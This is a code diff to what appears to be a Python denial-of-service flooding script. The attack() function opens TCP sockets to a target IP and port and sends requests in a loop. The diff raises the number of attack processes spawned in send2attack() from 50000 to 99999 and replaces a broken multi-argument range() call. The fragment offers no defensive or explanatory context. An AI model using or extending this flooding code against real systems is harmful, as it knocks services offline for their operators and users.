@@ -35,7 +35,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80,8080,443,111,55,23):
+      for y in range(80):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
@@ -57,7 +57,7 @@ print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
 print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
 
 def send2attack():
-  for i in range(50000): #Poder Mágico
+  for i in range(99999): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
